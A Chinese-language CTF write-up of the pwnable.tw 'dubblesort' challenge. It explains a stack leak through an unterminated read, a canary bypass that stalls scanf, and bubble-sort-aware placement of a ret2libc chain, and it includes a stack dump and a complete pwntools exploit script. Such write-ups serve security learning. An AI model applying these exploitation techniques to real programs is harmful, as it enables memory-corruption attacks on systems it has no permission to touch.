---
Layout: Post
title: pwnable.tw dubblesort
date: 2022-08-06 07:49:02
tags: pwnable.tw
---
难度不大的一关，而且网上有比我的做法更简单（但具有技巧性）的做法。
但是还是做了好久好久……不是耗在题目上，主要是耗在搞libc版本上。

## 题目

保护全开的i386程序。
首先提示输入姓名，用read读取，并用 `printf("...%s...", buf)` 打印出来（这种形式没办法利用格式化字符串漏洞）。
然后提示输入数组大小和数据，在循环中用 `scanf("%u", a[i])` 读取，数组大小无极限（但循环变量用寄存器表示，无法跳过某地址读写）。
最后**对数组进行冒泡排序**，并将排序后的数组一个一个输出。

<!-- more -->

本题有两个漏洞：

1. read读取数据时不会自动补上 `\0`，所以打印的时候可以泄露一些栈上的数据。（但由于大小控制良好，无法栈溢出，无法泄露canary）
2. 数组大小无极限，可以进行栈溢出。

问题主要是：

1. 栈上有哪些数据可供泄露？
2. 如何应对canary？
3. 如何让我的gadget在经过排序后仍旧待在正确的位置？

### 第一个问题：泄露数据

由于这是俺第一次做提供了libc的题目，我前前后后摸索了很久。

本题栈上数据有很多，我选择泄露libc里的一个地址。
本地环境下，这个地址是GOT，然而在线环境下同一个位置的值变了，好在仍然是libc里的某地址，现场计算一下偏移仍然可以用：

```python
print(io.recvS())
io.send(b'a'*4*7 + b'\x01')
mes = io.recvrepeat(1)
libc_base = unpack(mes[34:34+4])-0x1 - libc_offset
print(hex(libc_base))
```

### 第二个问题：如何应对canary

看网上大佬的wp，可以利用单个的"+"或者"-"来欺骗 `scanf("%u", a[i])` ，引发“读取成功但读个寂寞”的效果，这是因为scanf会将这俩当作数字的正负号来对待。
这是一个技巧性很强的trick，我没有想到。我的方法是在读取数据循环到canary的位置的时候，输入一个任意非数字字符串（"stop"），由于程序没有写清空输入流的操作，所以包括该scanf之内的所有后续scanf都会跳过，引发“读取失败且读个寂寞”效果。

采用这种方法，就可以在保留canary在栈上的情况下，通过之后的冒泡排序，将比canary大的数据移动到canary之后。
但是缺点是canary之后的数据无法覆盖，只能想办法应付。

### 第三个问题：如何应对/利用冒泡排序

本题的冒泡排序将大的数字移到上边（地址高位），小的数据移到下面。
采用上述的应对canary方法，有一些数据是无法进行覆盖的，排序的时候必须考虑这些已有数据。

```gdb
pwndbg> stack 50
00:0000│ esp 0xffffce30 —▸ 0xffffce4c ◂— 0x1
01:0004│     0xffffce34 ◂— 0x1
02:0008│     0xffffce38 ◂— 0x0
03:000c│     0xffffce3c —▸ 0xf7ffdc08 —▸ 0xf7fd7000 ◂— jg     0xf7fd7047
04:0010│     0xffffce40 —▸ 0xf7ffcd00 (_rtld_global_ro) ◂— 0x0
05:0014│     0xffffce44 —▸ 0xffffcf6c —▸ 0xffffd184 ◂— 'HTTP_PROXY=http://192.168.21.1:7890/'
06:0018│     0xffffce48 ◂— 0x1
（以下为数组开始处）
07:001c│     0xffffce4c ◂— 0x1
08:0020│ edi 0xffffce50 —▸ 0xf7ffddd8 —▸ 0xf7ffdd64 —▸ 0xf7ffdc1c —▸ 0xf7ffdc08 ◂— ...
09:0024│     0xffffce54 —▸ 0xffffcea0 ◂— 0x1
0a:0028│     0xffffce58 ◂— 0x0
... ↓        2 skipped
0d:0034│     0xffffce64 —▸ 0xffffd151 ◂— '/home/nss/Desktop/pwnable.tw/dubblesort/dubblesort'
0e:0038│     0xffffce68 —▸ 0xf7fcd000 ◂— 0x1afdb0
0f:003c│     0xffffce6c ◂— 0x6b63614a ('Jack')
10:0040│     0xffffce70 —▸ 0xffff0a79 ◂— 0x0
11:0044│     0xffffce74 ◂— 0x2f /* '/' */
12:0048│     0xffffce78 ◂— 0x50 /* 'P' */
13:004c│     0xffffce7c —▸ 0xf7eac82f ◂— add    edi, 0x1207d1
14:0050│     0xffffce80 ◂— 0x1
15:0054│     0xffffce84 ◂— 0x8000
16:0058│     0xffffce88 —▸ 0xf7fcd000 ◂— 0x1afdb0
17:005c│     0xffffce8c —▸ 0x56555601 ◂— add    ebx, 0x199f
18:0060│     0xffffce90 —▸ 0x565557a9 ◂— add    ebx, 0x17f7
19:0064│     0xffffce94 —▸ 0x56556fa0 ◂— 0x1ea8
1a:0068│     0xffffce98 ◂— 0x1
1b:006c│     0xffffce9c —▸ 0x56555b72 ◂— add    edi, 1
1c:0070│     0xffffcea0 ◂— 0x1
1d:0074│     0xffffcea4 —▸ 0xffffcf64 —▸ 0xffffd151 ◂— '/home/nss/Desktop/pwnable.tw/dubblesort/dubblesort'
1e:0078│     0xffffcea8 —▸ 0xffffcf6c —▸ 0xffffd184 ◂— 'HTTP_PROXY=http://192.168.21.1:7890/'
（以下为canary以及无法覆盖的数据）
1f:007c│     0xffffceac ◂— 0xadd66300
20:0080│     0xffffceb0 —▸ 0xf7fcd3dc —▸ 0xf7fce1e0 ◂— 0x0
21:0084│     0xffffceb4 —▸ 0xffffd14b ◂— 'i686'
22:0088│     0xffffceb8 —▸ 0x56555b2b ◂— add    ebx, 0x1475
23:008c│     0xffffcebc ◂— 0x0
24:0090│     0xffffcec0 —▸ 0xf7fcd000 ◂— 0x1afdb0
25:0094│     0xffffcec4 —▸ 0xf7fcd000 ◂— 0x1afdb0
26:0098│ ebp 0xffffcec8 ◂— 0x0
27:009c│     0xffffcecc —▸ 0xf7e35637 (__libc_start_main+247) ◂— add    esp, 0x10
28:00a0│     0xffffced0 ◂— 0x1
29:00a4│     0xffffced4 —▸ 0xffffcf64 —▸ 0xffffd151 ◂— '/home/nss/Desktop/pwnable.tw/dubblesort/dubblesort'
2a:00a8│     0xffffced8 —▸ 0xffffcf6c —▸ 0xffffd184 ◂— 'HTTP_PROXY=http://192.168.21.1:7890/'
2b:00ac│     0xffffcedc ◂— 0x0
... ↓        2 skipped
2e:00b8│     0xffffcee8 —▸ 0xf7fcd000 ◂— 0x1afdb0
2f:00bc│     0xffffceec —▸ 0xf7ffdc04 ◂— 0x0
30:00c0│     0xffffcef0 ◂— 0x1
31:00c4│     0xffffcef4 ◂— 0x0
```

我把（栈上的）数据由小到大分为5类：

1. 极小值：0或1
2. 代码段：0x56xxxxxx
3. canary：随机，但可以假设大小在该位置
4. libc代码地址：0xf7xxxxxx，比如 `__libc_start_main`
5. 极大值：libc的got及以上的地址。（libc的RW段、程序的栈地址等）

而ROP用到的gadget地址（`system` 和 `"/bin/sh"`）都位于4、5中间，也就是大于 `__libc_start_main`，小于libc的got。

简单思考一下：极大值一定会排在最后，因此我们要达到的效果是（注意32位函数调用规则，地址后面是返回地址，然后才是函数参数）：

```
esp+0x1c | 0, 1......
...
esp+0x78 | 0x56xxxxxxxx
esp+0x7c | canary
esp+0x80 | libc_start_main or libc_base or whatever （I just used system）
...
ebp+0x04 | system
ebp+0x08 | system(ret_addr)
ebp+0x0c | "/bin/sh\x00"
esp+0x10 | big value like libc_got
...
```

按照这个效果，进行一下不可控数据中极大值和极小值的配平（过程略），就可以计算出需要输入哪些数据。
exp脚本如下：

```python
from pwn import *
context.arch='i386'
context.log_level='debug'

filename="./dubblesort"
# io = process([filename], env={"LD_PRELOAD":"./libc_32.so.6"})
elf=ELF(filename)

libc_name="./libc_32.so.6"
libc=ELF(libc_name)

io = remote('chall.pwnable.tw', 10101)

# g = gdb.attach(io, """b *main+245
# commands
#  stack 50
# end""")

def send_d(data):
 io.sendlineafter(b": ", str(data).encode('ascii'))

libc_offset = 0x1b0000 - 0x1e00
sys_offset = 0x3a940
sh_str_offset = 0x158e8b

print(io.recvS())
io.send(b'a'*4*7 + b'\x01')
mes = io.recvrepeat(1)
libc_base = unpack(mes[34:34+4])-0x1 - libc_offset
print(hex(libc_base))

io.sendline(b'43')

for i in range(0, 15):
 send_d(1)
for i in range(0, 8):
 send_d(libc_base + sys_offset)
send_d(libc_base + sh_str_offset)
io.sendlineafter(b": ", b"stop")

io.interactive()
```
